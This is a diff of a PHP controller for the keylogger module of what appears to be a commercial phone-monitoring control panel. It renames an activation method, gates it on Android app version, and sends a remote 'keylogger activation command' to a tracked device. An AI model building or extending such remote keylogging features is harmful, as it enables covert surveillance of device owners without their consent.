@@ -20,8 +20,8 @@ class Keylogger extends BaseModuleController
 
     public function indexAction()
     {   
-        if ($this->view->paid && $this->di['currentDevice']['os'] == 'android' &&  $this->di['isTest']) {
-            return $this->loh();
+        if ($this->view->paid && $this->di['currentDevice']['os'] === 'android' && $this->di['currentDevice']['app_version'] >= 11) {
+            return $this->withActivation();
         }
 
         $keyloggerModel = new \Models\Cp\Keylogger($this->di);
@@ -39,10 +39,10 @@ class Keylogger extends BaseModuleController
             $this->view->hasRecords = $keyloggerModel->hasRecords($this->di['devId']);
         }
 
-        $this->setView('cp/keylogger.htm');
+        $this->setView('cp/keylogger/index.htm');
     }
 
-    private function loh()
+    private function withActivation()
     {
         $settingsModel = new \Models\Cp\Settings($this->di);
         $settings = $settingsModel->getDeviceSettings($this->di['devId']);
@@ -63,15 +63,15 @@ class Keylogger extends BaseModuleController
                 $this->view->hasRecords = $keyloggerModel->hasRecords($this->di['devId']);
             }
 
-            $this->setView('cp/keylogger.htm');
+            $this->setView('cp/keylogger/index.htm');
         } else {
             if ($this->getRequest()->hasGet('activate')) {
                 $settingsModel->activateKeylogger($this->di['devId']);
-                $this->di['flashMessages']->add(FlashMessages::SUCCESS, $this->di['t']->_('Updated!'));
+                $this->di['flashMessages']->add(FlashMessages::SUCCESS, $this->di['t']->_('Keylogger activation command has been successfully sent! Command activation will take up to 20 min.'));
                 $this->redirect($this->di['router']->getRouteUrl('keylogger'));
             }
             
-            $this->setView('cp/keyloggerActivate.htm');
+            $this->setView('cp/keylogger/activation.htm');
         }
     }
 
